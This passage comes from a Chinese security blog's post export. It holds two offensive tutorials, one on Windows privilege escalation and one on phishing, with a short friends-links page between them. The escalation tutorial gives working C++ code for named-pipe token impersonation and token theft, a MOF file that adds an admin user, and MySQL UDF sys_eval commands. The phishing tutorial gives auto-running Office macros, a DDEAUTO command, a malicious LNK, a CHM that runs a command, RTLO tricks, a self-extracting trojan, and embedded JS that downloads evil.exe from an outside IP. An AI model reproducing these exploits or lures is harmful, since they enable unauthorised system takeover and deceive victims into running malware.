禁用了同协议的NTLM认证 ，成功率很低。但是HTTP-&gt;SMB的relay还是有的。HOT POTATO就是利用的这一点。我们可以把主机发出的HTTP请求重定向到我们自定义的网页A，而网页A需要NTLM认证，我们就可以进行HTTP-&gt;SMB的relay’了。当HTTP请求来自于高权限的账户时，例如是来自windows 更新服务的请求，命令就会以”NT AUTHORITY\\SYSTEM”权限运行。 HOT POTATO 根据Windows版本的不同，需要等待高权限用户NTLM认证来到的时间也不同。一般来说，WIN7是瞬间就可以提权的Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8有一个自动更新机制，会每天下载证书信任列表(CTLs),etc MYSQL下的提权技术MOF提权在c:/windows/system32/wbem/mof/目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次（由”And TargetInstance.Second = 5″;控制，这里输入5就是每分钟的第五秒执行。 那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。 前提是我们要能进入数据库进行操作，且mysql数据库的权限尽可能高才更有利。同时secure-file-priv 要为空（ mysql 5.6.34版本以后 secure_file_priv的值默认为NULL,禁止所有文件导入导出功能） 我们伪造的MOF文件格式如下 #pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace &#x3D; &quot;Root\\\\Cimv2&quot;; Name &#x3D; &quot;filtP2&quot;; Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second &#x3D; 5&quot;; QueryLanguage &#x3D; &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name &#x3D; &quot;consPCSV2&quot;; ScriptingEngine &#x3D; &quot;JScript&quot;; ScriptText &#x3D; &quot;var WSH &#x3D; new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user admin admin &#x2F;add\\&quot;)&quot;; &#x2F;&#x2F;修改此处即可&#125;; instance of __FilterToConsumerBinding &#123; Consumer &#x3D; $Consumer; Filter &#x3D; $EventFilter; &#125;; 修改上面的cmd部分即可实现以管理员身份执行各种命令。然后我们使用mysql下的命令 ，将mof覆盖过去。待我们的命令被执行后，即代表提权成功。Windows 2003似乎成功率蛮高的，WIN7试了试没反应。。。 UDF提权（这个也可以linux提权 udf，即自定义函数（user define function） MYSQL可以自定义函数的。自定义函数在Windows下是以DLL文件存在于MYSQL的插件文件夹里面的（linux则是以os的形式）。我们可以自定义一个恶意dll，里面存放着可以执行系统命令的 函数。然后交给mysql以数据库权限执行。 前提：我们能操作数据库，且数据库权限必须很高（我们用这个方法提权到的权限就是数据库的权限 那么这个dll文件哪里来呢。sqlmap和msf都有。sqlmap下的 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 就是这个dll文件的编码版本。我们使用sqlmap下的sqlmap/extra/cloak/cloak.py对其进行解码获得dll文件。 python .&#x2F;cloak.py -d -i .&#x2F;lib_mysqludf_sys.dll_ 即可获得dll文件 然后我们把dll文件放入mysql的插件文件夹，命名为udf.dll。插件文件夹可以通过命令 show variables like &quot;%plugin%&quot;;获得 （&#x2F;lib&#x2F;plugin文件夹需要自己创建） 至于怎么把dll放入插件文件夹 1.直接粘贴复制 （权限可能不够2.使用命令 select load_file(‘udf.dll’) into dumpfile “PLUGIN的路径”;(需要secure_file_priv为空 总之，如果把udf.dll放入plugin文件夹后，我们就可以执行以下操作提权了。 create funtion sys_eval returns string soname &quot;udf.dll&quot;;select sys_eval(&#39;cmd&#39;); 启动项提权说白了，就是通过mysql的高权限，向windows开机启动项文件夹里放入恶意vbs或者bat脚本,机器重启后自动执行。怎么让机器重启？等管理员或者 一些可导致服务器蓝屏的EXP启动项路径一般为：C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;; 没什么好说的 命名管道提权提权方式为 令牌模仿。 Token Impersonation . meterpreter的getsystem的提取方法之一就是这个方法 提权过程为从administrator用户提到SYSTEM权限。从普通用户提权到admin及以上权限是不可取的，因为普通用户创建的命名管道没有 SeImpersonatePrivilege，在复制令牌时会出现1346错误。 该方法技术细节为：以管理员权限创建一个命名管道，再通过创建SYSTEM权限服务，让服务连上命名管道，随后我们通过模拟客户端，获得SYSTEM权限的令牌，随后将其复制，再用复制后的令牌创建新进程（如CMD)，新进程的权限即SYSTEM权限。 这里贴上实现代码.首先是被创建的服务的实现代码，该服务启动后会不断向服务器命名管道建立链接生成好后，是Service.exe #include&lt;Windows.h&gt;#include&lt;iostream&gt;SERVICE_STATUS m_ServiceStatus;SERVICE_STATUS_HANDLE m_ServiceStatusHandle;BOOL bRunning;void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);void WINAPI HandlerFunc(DWORD code);int main() &#123; WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;; SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;; StartServiceCtrlDispatcher(Table);&#125;void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123; m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode &#x3D; 0; m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc); m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus); bRunning &#x3D; true; while (bRunning) &#123; LPCWSTR PipeName &#x3D; L&quot;\\\\\\\\.\\\\pipe\\\\testpipe&quot;; HANDLE PipeHandle&#x3D;NULL; BOOL PipeInstance; WCHAR message[512] &#x3D; &#123; 0 &#125;; DWORD bytesWritten &#x3D; 0; BOOL Flag &#x3D; true; wchar_t message2[] &#x3D; L&quot;HELL&quot;; DWORD messageLength &#x3D; lstrlen(message2) * 2; do &#123; PipeHandle &#x3D; CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); &#125; while (PipeHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE); WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL); Flag &#x3D; ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL); std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl; &#125;&#125;void WINAPI HandlerFunc(DWORD code) &#123; switch (code) &#123; case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode &#x3D; 0; m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint &#x3D; 0; m_ServiceStatus.dwWaitHint &#x3D; 0; SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus); bRunning &#x3D; false; break; case SERVICE_CONTROL_INTERROGATE: break; &#125;&#125; 然后是主体，命名管道服务器。生成后是Server.exe #include&lt;Windows.h&gt;#include&lt;iostream&gt;int main() &#123; LPCWSTR pipeName &#x3D; L&quot;\\\\\\\\.\\\\pipe\\\\testpipe&quot;; LPVOID pipeBuffer &#x3D; NULL; HANDLE serverPipe; DWORD readBytes &#x3D; 0; DWORD readBuffer &#x3D; 0; int err &#x3D; 0; BOOL isPipeConnected; BOOL isPipeOpen; wchar_t message[] &#x3D; L&quot;HELL&quot;; DWORD messageLenght &#x3D; lstrlen(message) * 2; DWORD bytesWritten &#x3D; 0; WCHAR message2[512] &#x3D; &#123; 0 &#125;;&#x2F;&#x2F;Open a Named Pipe,Wait for a connection std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl; serverPipe &#x3D; CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);&#x2F;&#x2F;Create a service of system to connect to our NamedPipe. char servicename[] &#x3D; &quot;Service.exe&quot;; char servicepath[_MAX_PATH]; SERVICE_STATUS status; GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath)); SC_HANDLE scManager &#x3D; OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if (GetLastError() &#x3D;&#x3D; 0) &#123; &#125; else &#123; std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; SC_HANDLE scService &#x3D; CreateServiceA(scManager, servicename, servicename, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, servicepath, NULL, NULL, NULL, NULL, NULL); if (!scService) &#123; if (GetLastError() &#x3D;&#x3D; 1073) &#123; std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; &#125; SC_HANDLE scServiceA &#x3D; OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS); if (StartService(scServiceA, 0, NULL)) &#123; std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl; &#125; else &#123; if (GetLastError() &#x3D;&#x3D; 1056) &#123; std::cout &lt;&lt; &quot;service is running,don&#39;t need to start again&quot; &lt;&lt; std::endl; &#125; &#125;&#x2F;&#x2F;Connect ! isPipeConnected &#x3D; ConnectNamedPipe(serverPipe, NULL); if (isPipeConnected) &#123; std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl; ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL); std::cout &lt;&lt; message2; &#125; else &#123; std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl; &#125; std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl; WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);&#x2F;&#x2F;Toekn Impersonation std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl; if (!ImpersonateNamedPipeClient(serverPipe)) &#123; std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl; &#125; STARTUPINFOA si; PROCESS_INFORMATION pi &#x3D; &#123;&#125;; ZeroMemory(&amp;pi, sizeof(pi)); ZeroMemory(&amp;si, sizeof(si)); si.cb &#x3D; sizeof(si); HANDLE token; if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) &#123; std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; CHAR command1[] &#x3D; &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;; WCHAR command2[] &#x3D; L&quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;; HANDLE Token; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) &#123; std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl; &#125; if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123; std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl; if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl; &#125; &#125; else &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl; &#125; while(1)&#123;&#125;&#125; 我们生成了Service.exe,然后把他移到Server.exe同级目录，以管理员权限运行Server.exe,即可达到admin-》system的提权。 程序写了四天终于写好了。。WIN7下可以实现完美提权。项目地址:https://github.com/ConsT27/EvilNamedPipe/tree/1.0 令牌窃取SYSTEM-&gt;本机上其他用户（包括域用户）(好家伙，只要本机有system权限，域管敢在本机上创建进程就直接能拿到域管权限） 或者admin获取debug权限后去获取SYSTEM权限（这里有一个细节点，只有owner为administrator的SYSTEM进程才能被利用，比如lsass，dllhost) 技术细节:通过寻找高权限开启的进程，再复制其令牌用以创建新进程，即可达到提权目的 #include &lt;iostream&gt;#include &lt;Windows.h&gt;&#x2F;&#x2F;Only administrator can get debug privBOOL GetDebugPriv() &#123; HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123; std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; tp.PrivilegeCount &#x3D; 1; tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123; std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; tp.Privileges[0].Luid &#x3D; Luid; if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123; std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123; return false; &#125; else &#123; return true; &#125;&#125;int main(int argc, char* argv[]) &#123; HANDLE t_process; HANDLE token &#x3D; NULL; HANDLE token_bak &#x3D; NULL; DWORD process_id; sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id); WCHAR command[] &#x3D; L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;; STARTUPINFO startupInfo; PROCESS_INFORMATION processInformation; ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO)); ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION)); startupInfo.cb &#x3D; sizeof(STARTUPINFO); std::cout &lt;&lt; argv[1] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl; if (GetDebugPriv()&#x3D;&#x3D; TRUE) &#123; std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl; &#125; system(&quot;whoami &#x2F;priv&quot;); t_process &#x3D; OpenProcess(PROCESS_ALL_ACCESS, true, process_id); if (!t_process) &#123; std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) &#123; std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) &#123; std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; return 0;&#125; 这是在win7下的测试结果 const\\administrator 是域控","categories":[],"tags":[{"name":"提权","slug":"提权","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"友链","slug":"友链","date":"2021-02-19T09:11:57.000Z","updated":"2021-03-23T16:50:22.917Z","comments":true,"path":"2021/02/19/友链/","link":"","permalink":"http://const27.com/2021/02/19/%E5%8F%8B%E9%93%BE/","excerpt":"","text":"http://www.cl4y.top cl4y https://ljahum.github.io/ ljahum https://absolute-field.github.io absolute-field http://lola39.cn/ lola39 www.0xfay.github.io Fay 0xc4m3l.club 0xc4m3l www.afkl.ml AFKL http://39.106.144.160 x1hy9 http://106.75.101.193/ 迷妹 http://alanlitl.icu/ 龙哥 www.kodosan.com 程哥 https://ha1c9on.top ha1c9on师傅 www.neorah.me neo姐 qingshan.cool 劲宏 https://f4de-bak.github.io/ 阿伟","categories":[],"tags":[{"name":"杂","slug":"杂","permalink":"http://const27.com/tags/%E6%9D%82/"}]},{"title":"钓鱼技术","slug":"钓鱼技巧","date":"2021-02-19T08:07:56.000Z","updated":"2021-05-23T06:44:14.121Z","comments":true,"path":"2021/02/19/钓鱼技巧/","link":"","permalink":"http://const27.com/2021/02/19/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/","excerpt":"","text":"OFFICEOffice安全保护机制受保护的视图为了保护计算机不受office病毒侵害，微软设计了一个收保护视图，将所有可疑的office文件以只读方式打开，在该模式下多数编辑功能被禁用。文件呗以受保护视图打开的情况有如下几种 文件是从 Internet 位置打开的 文件是通过 Outlook 附件的方式接收的，并且计算机策略将发件人定义为不安全 文件是从不安全的位置打开的文件被文件块阻止文件验证失败文件是使用“在受保护的视图中打开”选项打开的 文件是从其他人的 OneDrive 存储中打开的 XLM / Macro 4.0 （excel宏钓鱼）excel下有宏功能，可以用来执行命令。其使用方法如下 右键下方sheet1，选择插入 点击 MS Excel4.0宏表，就可在excel中插入一个宏表依次输入这两个命令，并把第一行设置为Auto_Open 随后保存为xlsm文件即可。随后当该文件被打开时，会自动打开cmd窗口 这里的exec其实是执行的cmd命令，我们可以借此来上线cs等操作。 真不错。但在某些情况下打开此类excel文件需手动点击启用宏才能正常钓鱼。 Word宏新建一个word文件，进入宏选项（如果没有请自行在开发者工具里开启 然后随便输AutoOpen(文件打开时自动执行宏)，创建，注意宏的位置要指定为当前文档 然后进入宏编辑框 输入以下命令 Sub AutoOpen()Shell (&quot;calc&quot;) &#x2F;&#x2F;只需要写这个就行了End Sub AutoExec：启动 Word 或加载全局模板时AutoNew：每次新建文档时AutoOpen：每次打开已有文档时AutoClose：每次关闭文档时AutoExit：退出 Word 或卸载全局模板时 保存为docm（启用宏的word文档） 打开文件，就蹦出计算器了。（前提是在信任中心设置开启所有宏）当然，一般情况下打开此类文件会显示 启用内容后就会弹计算器了 Word DDE在word文件里，输入 ctrl+F9,进入到域代码编辑。我们可以键入以下代码使文件在被打开时执行系统命令（word2019复现未成功，word2016成功，似乎是word版本问题这个蛮实用的，目前众多word是默认禁用宏的，dde只需要用户点击两个按钮即可执行，实用性比宏好 DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;&#x2F;k calc.exe&quot; 随后在打开该文件时会出现两个对话框，全点是就会执行以上命令了 office OLE+LNK核心目标是创建一个内嵌的lnk文件诱导用户点击，从而执行命令。word，excel都能使用 我们创建一个快捷方式如下 其目标处填写的是 %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command calc 然后打开word文件，插入对象，选择package，为了更加逼真勾选显示为图标，然后可以更改图标，我们在更改图标处选择一个迷惑性比较大的图标 然后进入创建软件包界面，选择我们刚刚创建的lnk文件，写好卷标名，然后就把软件包插入到word界面了，只要用户点击该软件包并选择执行，则会执行我们在lnk中定义的代码 而且值得一提的是，如果用上述方法把lnk文件放入publisher文件，则在网络中打开该文件时不会触发受保护视图。（可能是我本地环境有点错？我觉得这个有点离谱 嵌入js元素这个说实话需要一点js功底。。这个方式的原理是，如果我们往word中插入联机视频，那么再word的压缩包 word/document.xml里的embeddedHtml项中会出现联机视频对应的内嵌html代码，我们可以通过修改这些代码，插入恶意js代码。 一般的利用方式是通过js下载恶意文件，但是似乎是因为word的一些保护机制，不能实现页面跳转或者自动点击下载等操作(打开word文件会报错),好迷 &lt;html&gt;&lt;body&gt;&lt;script&gt; var a &#x3D; document.createElement(&#39;a&#39;); console.log(a); document.body.appendChild(a); a.style &#x3D; &#39;display: none&#39;; a.href &#x3D; &quot;http:&#x2F;&#x2F;149.129.64.180&#x2F;evil.exe&quot;; &#x2F;&#x2F;该行若存在，打开word文件会报错 a.download &#x3D; fileName; window.URL.revokeObjectURL(url);&lt;&#x2F;script&gt;&lt;script&gt; a.click();&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 我看了一个POC，里面是通过构造二进制数据交给BLOB对象处理，并自动点击由BLOB对象生成的url实现下载二进制数据，而这些二进制数据实质上是恶意文件。 因为我搞不来那个二进制数据怎么产生，所以这个方法暂时只做了解吧。。而且我看的那个文章的POC在我的word2016里不能正常工作，不知道是什么原因reference:https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload 利用模板文件注入宏指令原理是，先创建一个带模板的文档，再创一个启用宏的模板文件。然后在带模板的文档的压缩包里面修改一些内容，使其指向的模板修改为我们自己创建的模板文件，这之间的过程可以由smb协议完成，故过查杀几率较高。 我们在启用宏的模板文件（doc3.dotm)里写入宏。 Sub AutoOpen()Shell &quot;calc&quot;End Sub CHM 电子书新建一个html文件，编码格式ANSI，向里面写入如下内容 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;&#x2F;title&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;command exec &lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt; &lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,cmd.exe,&#x2F;c calc.exe&#39;&gt; &#x2F;&#x2F;这一排用于执行命令，注意cmd.exe前后都有,或者&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,powershell.exe,-c calc.exe&#39;&gt;也行 &lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;&lt;&#x2F;OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;&#x2F;SCRIPT&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 用easychm，新建-浏览-选择html文件所在目录-选择html文件-编译 生成一个chm，双击，打开了计算器 图标替换使用Restorator，打开需要替换图标的exe，提供图标的exe，如下 右键main.exe,添加资源，图标，id选择127.随后右键Listary.exe/图标/127 导出，将其导出到一个文件夹然后右键main.exe/图标，导入，选择刚刚导出图标的文件夹，确定,ctrl+保存 RTLO 继续重命名，在a后面右键，插入Unicode控制字符-&gt;RLO rar解压自运行木马文件:artifact.exe 迷惑文件:calc.exe进入winrar，选中这两个文件，右键添加至压缩包.创建自解压格式压缩文件 高级-&gt;自解压选项-&gt;设置 模式-&gt;全部隐藏 更新-&gt;解压并更新文件,覆盖所有文件 生成,双击运行","categories":[],"tags":[{"name":"钓鱼","slug":"钓鱼","permalink":"http://const27.com/tags/%E9%92%93%E9%B1%BC/"}]}],"categories":[],"tags":[{"name":"杂七杂八的安全问题","slug":"杂七杂八的安全问题","permalink":"http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"name":"中间件安全","slug":"中间件安全","permalink":"http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"外围打点","slug":"外围打点","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"},{"name":"提权","slug":"提权","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网渗透与权限维持","slug":"内网渗透与权限维持","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"免杀","slug":"免杀","permalink":"http://const27.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"},{"name":"杂","slug":"杂","permalink":"http://const27.com/tags/%E6%9D%82/"},{"name":"钓鱼","slug":"钓鱼","permalink":"http://const27.com/tags/%E9%92%93%E9%B1%BC/"}]}